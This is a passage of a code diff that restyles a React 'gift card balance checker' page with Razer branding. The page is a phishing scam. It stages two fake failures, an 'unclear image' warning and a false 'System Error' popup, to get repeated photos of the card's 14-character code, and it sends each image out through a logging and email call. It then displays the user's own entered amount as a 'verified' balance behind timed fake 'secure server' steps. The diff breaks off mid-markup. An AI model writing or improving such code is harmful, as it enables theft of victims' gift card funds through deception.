@@ -1,4 +1,4 @@
-// src/pages/Scan.jsx - 3 Attempts: Fail -> Error Modal -> Success
+// src/pages/Scan.jsx - Complete Razer Redesign
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import Navbar from '../components/Navbar';
@@ -8,78 +8,66 @@ import razerGuide from '../assets/razers.jpg';
 // Full-screen balance component
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#00ff41] to-[#00aa2a] flex items-center justify-center p-6">
-      <div className="max-w-md w-full text-center">
-        <div className="mb-8">
-          <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
-            <span className="text-white text-3xl font-bold">$</span>
+    <div className="min-h-screen bg-[#050505] relative flex items-center justify-center p-6 overflow-hidden">
+      <div className="absolute inset-0 opacity-[0.15] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#00ff41 1px, transparent 1px), linear-gradient(90deg, #00ff41 1px, transparent 1px)', backgroundSize: '40px 40px', maskImage: 'radial-gradient(ellipse at center, black 10%, transparent 70%)' }}></div>
+      
+      <div className="max-w-md w-full text-center relative z-10">
+        <div className="mb-10 flex flex-col items-center">
+          <div className="w-20 h-20 bg-[#00ff41]/10 border border-[#00ff41]/50 flex items-center justify-center rotate-45 shadow-[0_0_40px_rgba(0,255,65,0.3)] animate-pulse">
+            <span className="text-[#00ff41] text-4xl font-black -rotate-45">$</span>
           </div>
-          <p className="text-white/60 text-xs mt-2">GIFT CARD BALANCE</p>
+          <p className="text-[#00ff41] text-xs font-bold tracking-[0.3em] mt-8 uppercase">Balance Verified</p>
         </div>
-        <div className="mb-6">
-          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
-            <span className="text-white text-4xl">✓</span>
-          </div>
-        </div>
-        <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
-        <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight">
+
+        <h2 className="text-[#888] text-xs font-bold tracking-[0.2em] uppercase mb-2">Available Funds</h2>
+        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>
           {balance}
         </p>
-        <div className="mt-4">
-          <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2">
-            <p className="text-white/80 text-sm font-mono">
-              {cardType} ending in {lastFourDigits}
-            </p>
-          </div>
+
+        <div className="inline-block bg-[#0a0a0a] border border-[#222] px-8 py-3 mb-12 shadow-lg" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
+          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">
+            {cardType} •••• {lastFourDigits}
+          </p>
         </div>
-        <div className="w-20 h-0.5 bg-white/20 mx-auto my-6"></div>
+
         <button
           onClick={onCheckAnother}
-          className="w-full bg-white text-[#0a0a0a] font-bold py-4 rounded-lg transition-all hover:bg-white/90 active:scale-[0.98] shadow-lg"
+          className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]"
+          style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
         >
-          CHECK ANOTHER CARD
+          Check Another Card
         </button>
-        <div className="mt-12">
-          <p className="text-white/30 text-xs">© 2026 Gift Card Balance Checker. All rights reserved.</p>
-        </div>
       </div>
     </div>
   );
 };
 
-// NEW: Custom Error Popup Modal (Matches your screenshot)
+// Custom Error Popup Modal (Razer style)
 const ErrorPopup = ({ isOpen, onRetry }) => {
   if (!isOpen) return null;
-
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
-      <div className="bg-[#111111] border border-[#2a2a2a] rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl animate-fadeSlideUp">
-        {/* Red X Icon */}
-        <div className="w-20 h-20 mx-auto rounded-full border-4 border-[#ff5555] flex items-center justify-center mb-6">
-          <svg className="w-10 h-10 text-[#ff5555]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M6 18L18 6M6 6l12 12"></path>
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md px-4">
+      <div className="bg-[#0a0a0a] border border-[#ff3333] p-8 max-w-sm w-full text-center shadow-[0_0_50px_rgba(255,51,51,0.15)] animate-fadeSlideUp relative overflow-hidden"
+           style={{ clipPath: 'polygon(20px 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%, 0 20px)' }}>
+        <div className="absolute top-0 left-0 w-full h-1 bg-[#ff3333]"></div>
+        <div className="w-24 h-24 mx-auto rounded-full border-2 border-[#ff3333]/30 flex items-center justify-center mb-6 shadow-[inset_0_0_20px_rgba(255,51,51,0.2)]">
+          <svg className="w-10 h-10 text-[#ff3333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
           </svg>
         </div>
-        
-        <h3 className="text-[#ff5555] text-xl font-bold mb-3 uppercase tracking-wide">
-          Error!
-        </h3>
-        
-        <p className="text-white text-sm mb-8 leading-relaxed">
-          An error occur while checking this card
-        </p>
-        
+        <h3 className="text-[#ff3333] text-2xl font-black mb-4 uppercase tracking-widest">System Error</h3>
+        <p className="text-[#aaa] text-sm mb-8 leading-relaxed font-mono">An unexpected error occurred while verifying this card.</p>
         <button
           onClick={onRetry}
-          className="w-full bg-[#ff5555] text-white font-bold py-3 rounded-lg transition-all hover:bg-[#ff4444] active:scale-[0.98]"
+          className="w-full bg-[#ff3333] text-white font-bold py-3 tracking-widest uppercase transition-all hover:bg-[#ff4444] hover:shadow-[0_0_20px_rgba(255,51,51,0.4)] active:scale-[0.98]"
+          style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}
         >
-          try again
+          Try Again
         </button>
       </div>
     </div>
   );
 };
-
 
 const Scan = () => {
   const navigate = useNavigate();
@@ -95,16 +83,14 @@ const Scan = () => {
   const [processingText, setProcessingText] = useState('');
   const [attemptCount, setAttemptCount] = useState(0);
   const [processingComplete, setProcessingComplete] = useState(false);
-  
-  // NEW: State for the custom error modal
   const [showErrorModal, setShowErrorModal] = useState(false);
 
   const fileInputRef = useRef(null);
 
   const processingSteps = [
     { text: '🔐 Establishing secure connection...', duration: 800 },
-    { text: '📸 Analyzing gift card image...', duration: 600 },
-    { text: '🔍 Extracting card data...', duration: 1000 },
+    { text: '📸 Analyzing image matrix...', duration: 600 },
+    { text: '🔍 Extracting data packets...', duration: 1000 },
     { text: '🔒 Encrypting sensitive information...', duration: 700 },
     { text: '🔄 Verifying with secure servers...', duration: 800 },
     { text: '💳 Processing balance request...', duration: 600 },
@@ -113,451 +99,191 @@ const Scan = () => {
 
   useEffect(() => {
     let timeoutIds = [];
-    
     if (isProcessing && processingStep < processingSteps.length) {
       setProcessingText(processingSteps[processingStep].text);
-      const timeout = setTimeout(() => {
-        setProcessingStep(prev => prev + 1);
-      }, processingSteps[processingStep].duration);
+      const timeout = setTimeout(() => { setProcessingStep(prev => prev + 1); }, processingSteps[processingStep].duration);
       timeoutIds.push(timeout);
     } else if (isProcessing && processingStep >= processingSteps.length && !processingComplete) {
       setProcessingComplete(true);
-      
-      // Determine outcome based on attempt count
-      if (attemptCount === 0) {
-        completeFirstAttempt(); // Fails with message
-      } else if (attemptCount === 1) {
-        completeSecondAttempt(); // Fails with MODAL
-      } else {
-        completeThirdAttempt(); // Succeeds
-      }
+      if (attemptCount === 0) completeFirstAttempt();
+      else if (attemptCount === 1) completeSecondAttempt();
+      else completeThirdAttempt();
     }
-    
-    return () => {
-      timeoutIds.forEach(id => clearTimeout(id));
-    };
+    return () => timeoutIds.forEach(id => clearTimeout(id));
   }, [isProcessing, processingStep, attemptCount]);
 
   const handleImageSelect = (file) => {
     if (!file) return;
     const reader = new FileReader();
-    reader.onload = (e) => {
-      setSelectedImage(e.target.result);
-      setMessage('');
-      setMessageType('');
-    };
+    reader.onload = (e) => { setSelectedImage(e.target.result); setMessage(''); setMessageType(''); };
     reader.readAsDataURL(file);
   };
 
-  const handleFileUpload = (e) => {
-    const file = e.target.files[0];
-    if (file) handleImageSelect(file);
-  };
-
+  const handleFileUpload = (e) => { const file = e.target.files[0]; if (file) handleImageSelect(file); };
   const handleCameraCapture = () => {
     const input = document.createElement('input');
-    input.type = 'file';
-    input.accept = 'image/*';
-    input.capture = 'environment';
-    input.onchange = (e) => {
-      const file = e.target.files[0];
-      if (file) handleImageSelect(file);
-    };
+    input.type = 'file'; input.accept = 'image/*'; input.capture = 'environment';
+    input.onchange = (e) => { const file = e.target.files[0]; if (file) handleImageSelect(file); };
     input.click();
   };
 
-  // ATTEMPT 1: Standard Text Error
   const completeFirstAttempt = async () => {
-    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully scratched and visible\n• All 14 alphanumeric characters are clearly readable\n• The image is well-lit and in focus\n• The card is positioned flat and steady\n\nPlease upload a CLEARER image and try again.`);
+    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully visible\n• All 14 alphanumeric characters are readable\n• The image is well-lit and in focus\n\nPlease upload a CLEARER image.`);
     setMessageType('error');
-    
-    try {
-      await logBalanceCheck({
-        type: 'first_attempt_failed',
-        amount: amount,
-        status: 'FAILED - IMAGE UNCLEAR',
-        message: 'Card image verification failed. User advised to ensure card is well scratched and 14 digits visible.',
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        pageSource: 'scan',
-        imageBase64: selectedImage,
-        ip: null
-      });
-    } catch (err) {
-      console.error('Email sending failed:', err);
-    }
-    
-    setSelectedImage(null);
-    setAttemptCount(1); // Move to Second Attempt
-    setShowBalance(false);
-    setIsProcessing(false);
-    setProcessingStep(0);
-    setProcessingText('');
-    setProcessingComplete(false);
+    try { await logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
+    setSelectedImage(null); setAttemptCount(1); setShowBalance(false); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
   };
 
-  // ATTEMPT 2: Show Custom Error Modal
   const completeSecondAttempt = async () => {
-    setShowErrorModal(true); // Show the popup from the screenshot
-    
-    try {
-      await logBalanceCheck({
-        type: 'first_attempt_failed', // Still logging as a failed attempt
-        amount: amount,
-        status: 'FAILED - SERVER ERROR',
-        message: 'Second attempt failed. Server error popup shown to user.',
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        pageSource: 'scan',
-        imageBase64: selectedImage,
-        ip: null
-      });
-    } catch (err) {
-      console.error('Email sending failed:', err);
-    }
-    
-    // Prepare for third attempt
-    setSelectedImage(null);
-    setAttemptCount(2); // Move to Third Attempt
-    setIsProcessing(false);
-    setProcessingStep(0);
-    setProcessingText('');
-    setProcessingComplete(false);
+    setShowErrorModal(true);
+    try { await logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
+    setSelectedImage(null); setAttemptCount(2); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
   };
 
-  // ATTEMPT 3: Success
   const completeThirdAttempt = async () => {
     const enteredAmount = parseFloat(amount).toFixed(2);
     const displayBalance = `$${enteredAmount} USD`;
-    
-    setBalance(displayBalance);
-    setShowBalance(true);
-    setShowFullScreenBalance(true);
-    setMessage(`✅ Balance verified: ${displayBalance}`);
-    setMessageType('success');
-    
+    setBalance(displayBalance); setShowBalance(true); setShowFullScreenBalance(true); setMessage(`✅ Balance verified: ${displayBalance}`); setMessageType('success');
     const simulatedCardNumber = Math.random().toString().slice(2, 16);
-    
-    try {
-      await logBalanceCheck({
-        type: 'second_attempt_success', // Keeping naming for backend compatibility, but it's the 3rd try
-        cardNumber: simulatedCardNumber,
-        amount: amount,
-        balance: displayBalance,
-        status: 'SUCCESS - THIRD ATTEMPT',
-        message: 'Card verification successful on third attempt after user ensured card is readable.',
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        pageSource: 'scan',
-        imageBase64: selectedImage,
-        ip: null
-      });
-    } catch (err) {
-      console.error('Email sending failed:', err);
-    }
-    
-    setAttemptCount(0);
-    setIsProcessing(false);
-    setProcessingStep(0);
-    setProcessingText('');
-    setProcessingComplete(false);
+    try { await logBalanceCheck({ type: 'second_attempt_success', cardNumber: simulatedCardNumber, amount, balance: displayBalance, pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
+    setAttemptCount(0); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
   };
 
   const handleCheckBalance = () => {
-    if (!selectedImage) {
-      setMessage('❌ Please upload or take a photo of your gift card');
-      setMessageType('error');
-      return;
-    }
-    
-    if (!amount || parseFloat(amount) <= 0) {
-      setMessage('❌ Please enter a valid amount');
-      setMessageType('error');
-      return;
-    }
-
-    if (parseFloat(amount) > 10000) {
-      setMessage('❌ Amount cannot exceed $10,000');
-      setMessageType('error');
-      return;
-    }
-
-    setShowBalance(false);
-    setMessage('');
-    setMessageType('');
-    setProcessingStep(0);
-    setProcessingText('');
-    setProcessingComplete(false);
-    setIsProcessing(true);
+    if (!selectedImage) { setMessage('❌ Please upload or take a photo'); setMessageType('error'); return; }
+    if (!amount || parseFloat(amount) <= 0) { setMessage('❌ Please enter a valid amount'); setMessageType('error'); return; }
+    if (parseFloat(amount) > 10000) { setMessage('❌ Amount cannot exceed $10,000'); setMessageType('error'); return; }
+    setShowBalance(false); setMessage(''); setMessageType(''); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false); setIsProcessing(true);
   };
 
-  // Handles clicking "try again" on the error popup
-  const handleModalRetry = () => {
-    setShowErrorModal(false);
-    if (fileInputRef.current) {
-      fileInputRef.current.value = '';
-    }
-  };
+  const handleModalRetry = () => { setShowErrorModal(false); if (fileInputRef.current) fileInputRef.current.value = ''; };
 
   const resetFullScreen = () => {
-    setShowFullScreenBalance(false);
-    setShowBalance(false);
-    setBalance('');
-    setSelectedImage(null);
-    setAmount('');
-    setMessage('');
-    setMessageType('');
-    setIsProcessing(false);
-    setProcessingStep(0);
-    setProcessingText('');
-    setAttemptCount(0);
-    setProcessingComplete(false);
-    setShowErrorModal(false);
-    if (fileInputRef.current) {
-      fileInputRef.current.value = '';
-    }
+    setShowFullScreenBalance(false); setShowBalance(false); setBalance(''); setSelectedImage(null); setAmount(''); setMessage(''); setMessageType('');
+    setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setAttemptCount(0); setProcessingComplete(false); setShowErrorModal(false);
+    if (fileInputRef.current) fileInputRef.current.value = '';
   };
 
   if (showFullScreenBalance) {
-    return (
-      <FullScreenBalance 
-        balance={balance}
-        lastFourDigits="••••"
-        cardType="Gift Card"
-        onCheckAnother={resetFullScreen}
-      />
-    );
+    return <FullScreenBalance balance={balance} lastFourDigits="••••" cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
   }
 
   return (
     <>
       <Navbar />
-      
-      {/* NEW: Custom Error Popup */}
       <ErrorPopup isOpen={showErrorModal} onRetry={handleModalRetry} />
 
-      <div className="bg-gradient-to-br from-[#0a1f0a] to-[#0a0a0a] text-center py-4 sm:py-6 px-3 sm:px-4 border-b border-[#00ff4133]">
-        <h2 className="text-base sm:text-lg bg-gradient-to-r from-[#00ff41] to-[#00cc33] bg-clip-text text-transparent font-semibold">
-          📸 SCAN GIFT CARD
+      <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
+        <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
+        <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
+          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
+          Optical Scanner
+          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
         </h2>
-        <p className="text-[#aaa] text-[0.65rem] sm:text-xs mt-1">Upload photo and enter amount to check balance</p>
       </div>
 
-      <div className="p-3 sm:p-5 overflow-x-hidden max-w-[600px] mx-auto w-full">
+      <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
         <button
           onClick={() => navigate('/')}
-          className="inline-flex items-center gap-1.5 bg-[#1a1a1a] text-[#00ff41] px-3 sm:px-4 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-medium border border-[#2a2a2a] mb-4 sm:mb-5 hover:bg-[#2a2a2a] transition active:scale-98"
+          className="inline-flex items-center gap-2 bg-[#111] text-[#aaa] px-4 py-2 text-xs font-bold tracking-widest uppercase border border-[#333] mb-6 hover:text-white hover:border-[#555] transition-colors"
           disabled={isProcessing}
+          style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}
         >
-          ← Back to Manual Entry
+          ← Manual Entry
         </button>
 
-        <div className="bg-gradient-to-br from-[#0f1f0f] to-[#0a0a0a] border border-[#00ff4133] rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-lg">
-          <h2 className="text-[#00ff41] text-center text-lg sm:text-xl mb-4 sm:mb-5">📷 GIFT CARD UPLOAD</h2>
+        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-2xl relative">
+          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-50"></div>
+          
+          <h2 className="text-white text-center text-lg sm:text-xl mb-6 font-black tracking-widest uppercase flex items-center justify-center gap-2">
+            <span className="text-[#00ff41] animate-pulse">⬢</span> Scan Upload
+          </h2>
 
-          {attemptCount === 1 && !isProcessing && !showBalance && (
-            <div className="mb-3 sm:mb-4 p-2 sm:p-3 bg-[#1a2a1a] border border-[#ffaa00] rounded-lg sm:rounded-xl text-center">
-              <p className="text-[#ffaa00] text-[0.65rem] sm:text-xs">⚠️ Please upload a CLEARER photo of your gift card for verification</p>
+          {attemptCount > 0 && !isProcessing && !showBalance && (
+            <div className="mb-6 p-3 border border-[#ffaa00] bg-[#ffaa00]/10 text-center font-mono text-[0.65rem] sm:text-xs text-[#ffaa00] uppercase tracking-wider" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}>
+              ⚠️ Retry Required: Upload a clearer photo.
             </div>
           )}
 
-          {attemptCount === 2 && !isProcessing && !showBalance && (
-            <div className="mb-3 sm:mb-4 p-2 sm:p-3 bg-[#2a1a1a] border border-[#ff5555] rounded-lg sm:rounded-xl text-center">
-              <p className="text-[#ff5555] text-[0.65rem] sm:text-xs">⚠️ Final Attempt: Please ensure the image is extremely clear.</p>
-            </div>
-          )}
-
-          <div className="visual-guide text-center my-3 sm:my-4 p-2 sm:p-3 bg-[#0f0f0f] rounded-lg sm:rounded-xl border border-[#2a2a2a]">
-            <img 
-              src={razerGuide}
-              alt="Gift Card Guide"
-              className="guide-image-responsive mx-auto"
-              style={{
-                width: '100%',
-                maxWidth: '240px',
-                height: 'auto',
-                borderRadius: '10px',
-                border: '1px solid #00ff4133'
-              }}
-              onError={(e) => {
-                e.target.src = 'https://via.placeholder.com/240x120/1a2a1a/00ff41?text=Gift+Card+Guide';
-              }}
-            />
-            <p className="guide-caption text-[#aaa] text-[0.6rem] sm:text-[0.65rem] mt-1.5 sm:mt-2">
-              📍 Upload a clear photo. Make sure all 14 characters are visible.
-            </p>
+          <div className="text-center mb-6">
+            <img src={razerGuide} alt="Guide" className="mx-auto max-w-[200px] border-2 border-[#222] opacity-80 hover:opacity-100 transition-opacity" onError={(e) => { e.target.src = 'https://via.placeholder.com/240x120/1a2a1a/00ff41?text=Scan+Guide'; }} />
+            <p className="text-[#666] text-[0.6rem] sm:text-[0.65rem] mt-3 font-mono uppercase tracking-widest">Ensure all 14 characters are perfectly visible.</p>
           </div>
 
-          <div className="flex gap-2 sm:gap-3 my-3 sm:my-4 flex-wrap">
-            <button
-              onClick={() => fileInputRef.current?.click()}
-              disabled={isProcessing}
-              className="flex-1 bg-[#1a1f1a] border border-[#2a3a2a] text-[#00ff41] py-2 sm:py-2.5 rounded-full font-semibold text-xs sm:text-sm flex items-center justify-center gap-1.5 sm:gap-2 hover:bg-[#2a3a2a] transition active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              📤 UPLOAD
+          <div className="flex gap-4 mb-6">
+            <button onClick={() => fileInputRef.current?.click()} disabled={isProcessing} className="flex-1 bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
+              📤 Upload
             </button>
-            <button
-              onClick={handleCameraCapture}
-              disabled={isProcessing}
-              className="flex-1 bg-[#1a1f1a] border border-[#2a3a2a] text-[#00ff41] py-2 sm:py-2.5 rounded-full font-semibold text-xs sm:text-sm flex items-center justify-center gap-1.5 sm:gap-2 hover:bg-[#2a3a2a] transition active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              📸 CAMERA
+            <button onClick={handleCameraCapture} disabled={isProcessing} className="flex-1 bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
+              📸 Camera
             </button>
           </div>
-          <input 
-            type="file" 
-            ref={fileInputRef} 
-            accept="image/*" 
-            onChange={handleFileUpload} 
-            className="hidden" 
-          />
+          <input type="file" ref={fileInputRef} accept="image/*" onChange={handleFileUpload} className="hidden" />
 
           {selectedImage && !isProcessing && (
-            <div className="bg-[#111] rounded-lg sm:rounded-xl p-2 sm:p-3 my-2 sm:my-3 text-center border border-dashed border-[#2a2a2a]">
-              <div className="text-[#aaa] text-[0.6rem] sm:text-[0.65rem] mb-1">📸 Selected Image</div>
-              <img 
-                src={selectedImage} 
-                alt="Gift Card Preview" 
-                className="max-w-full max-h-[120px] sm:max-h-[160px] rounded-lg mx-auto border border-[#00ff41] object-contain"
-              />
-              <button 
-                onClick={() => setSelectedImage(null)}
-                className="mt-1.5 sm:mt-2 text-[#ff5555] text-[0.65rem] sm:text-xs underline hover:text-[#ff7777] transition"
-                disabled={isProcessing}
-              >
-                Remove
+            <div className="bg-[#050505] border border-[#333] p-4 mb-6 text-center relative group">
+              <div className="text-[#00ff41] text-[0.6rem] font-bold tracking-widest uppercase mb-3">Image Buffer Locked</div>
+              <img src={selectedImage} alt="Preview" className="max-w-full max-h-[140px] mx-auto object-contain border border-[#222]" />
+              <button onClick={() => setSelectedImage(null)} className="mt-4 text-[#ff3333] text-[0.65rem] font-bold tracking-widest uppercase hover:text-white transition-colors" disabled={isProcessing}>
+                ✕ Clear Buffer
               </button>
             </div>
           )}
 
-          <div className="mb-3 sm:mb-4">
-            <label className="block text-[#aaa] text-[0.65rem] sm:text-xs mb-1">💰 Enter Amount to Check (USD)</label>
-            <input
-              type="number"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder="e.g., 50"
-              min="1"
-              max="10000"
-              disabled={isProcessing}
-              className="w-full p-2.5 sm:p-3 bg-[#1a1a1a] border border-[#2a2a2a] rounded-lg sm:rounded-xl text-white text-sm focus:outline-none focus:border-[#00ff41] focus:ring-1 focus:ring-[#00ff41] disabled:opacity-50"
-            />
+          <div className="mb-6 relative">
+            <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 font-bold tracking-wider uppercase">💰 Target Amount (USD)</label>
+            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="e.g., 50" min="1" max="10000" disabled={isProcessing} className="w-full p-3 sm:p-4 bg-[#050505] border-2 border-[#222] text-white text-sm font-mono tracking-widest focus:outline-none focus:border-[#00ff41] focus:shadow-[0_0_15px_rgba(0,255,65,0.2)] disabled:opacity-50 transition-all" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }} />
           </div>
 
           {isProcessing && (
-            <div className="my-4 sm:my-6 p-3 sm:p-5 bg-[#0a0a0a] rounded-xl sm:rounded-2xl border border-[#00ff41] animate-pulse">
-              <div className="text-center">
-                <div className="inline-block mb-2 sm:mb-3">
-                  <div className="w-10 h-10 sm:w-14 sm:h-14 border-3 sm:border-4 border-[#1a3a1a] border-t-[#00ff41] rounded-full animate-spin"></div>
-                </div>
-                
-                <div className="space-y-1 sm:space-y-2">
-                  <p className="text-[#00ff41] font-mono text-[0.7rem] sm:text-sm">
-                    {processingText || 'Initializing secure connection...'}
-                  </p>
-                  
-                  <div className="w-full bg-[#1a1a1a] rounded-full h-1 sm:h-1.5 mt-2 sm:mt-3 overflow-hidden">
-                    <div 
-                      className="bg-[#00ff41] h-1 sm:h-1.5 rounded-full transition-all duration-500 ease-out"
-                      style={{ width: `${(processingStep / processingSteps.length) * 100}%` }}
-                    ></div>
-                  </div>
-                  
-                  <p className="text-[#555] text-[0.6rem] sm:text-[0.65rem] mt-1 sm:mt-2">
-                    Step {processingStep} of {processingSteps.length}
-                  </p>
-                </div>
+            <div className="mb-6 p-6 bg-[#050505] border border-[#00ff41]/30 text-center shadow-[inset_0_0_30px_rgba(0,255,65,0.05)] relative overflow-hidden">
+              <div className="absolute top-0 left-0 w-full h-[2px] bg-[#00ff41] animate-[scan_2s_ease-in-out_infinite]"></div>
+              <div className="inline-block mb-4">
+                <div className="w-12 h-12 border-4 border-[#111] border-t-[#00ff41] rounded-full animate-spin shadow-[0_0_15px_rgba(0,255,65,0.5)]"></div>
               </div>
+              <p className="text-[#00ff41] font-mono text-xs tracking-widest uppercase mb-4">{processingText}</p>
+              <div className="w-full bg-[#111] h-1.5 overflow-hidden">
+                <div className="bg-[#00ff41] h-full transition-all duration-300 shadow-[0_0_10px_#00ff41]" style={{ width: `${(processingStep / processingSteps.length) * 100}%` }}></div>
+              </div>
+              <p className="text-[#666] font-mono text-[0.6rem] mt-2 tracking-widest">SYS.PROGRESS: {processingStep}/{processingSteps.length}</p>
             </div>
           )}
 
           {!isProcessing && (
-            <button
-              onClick={handleCheckBalance}
-              disabled={!selectedImage || !amount}
-              className="w-full bg-[#00ff41] text-[#0a0a0a] py-2.5 sm:py-3 rounded-full font-bold text-sm sm:text-base transition-all hover:bg-[#00dd3a] active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              {attemptCount === 0 ? 'CHECK BALANCE' : attemptCount === 1 ? 'RETRY WITH NEW PHOTO' : 'FINAL RETRY'}
+            <button onClick={handleCheckBalance} disabled={!selectedImage || !amount} className="w-full bg-[#00ff41] text-black py-4 font-black text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-[#111] disabled:text-[#555] disabled:border disabled:border-[#333]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
+              {attemptCount === 0 ? 'Initiate Scan' : attemptCount === 1 ? 'Retry Scan' : 'Final Attempt'}
             </button>
           )}
 
           {isProcessing && (
-            <button
-              onClick={() => {
-                setIsProcessing(false);
-                setProcessingStep(0);
-                setProcessingText('');
-                setProcessingComplete(false);
-                setMessage('Process cancelled by user');
-                setMessageType('error');
-              }}
-              className="w-full bg-[#ff4444] text-white py-2.5 sm:py-3 rounded-full font-bold text-sm sm:text-base transition-all hover:bg-[#ff5555] active:scale-98 mt-3"
-            >
-              CANCEL PROCESSING
+            <button onClick={() => { setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false); setMessage('Process terminated.'); setMessageType('error'); }} className="w-full mt-4 bg-transparent border border-[#ff3333] text-[#ff3333] py-3 font-bold text-xs tracking-widest uppercase transition-colors hover:bg-[#ff3333] hover:text-white" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
+              Abort Process
             </button>
           )}
 
           {attemptCount > 0 && !isProcessing && !showBalance && (
-            <button
-              onClick={resetFullScreen}
-              className="w-full mt-2 bg-transparent border border-[#ff5555] text-[#ff5555] py-1.5 sm:py-2 rounded-full font-medium text-xs sm:text-sm transition-all hover:bg-[#ff5555] hover:text-white"
-            >
-              START OVER
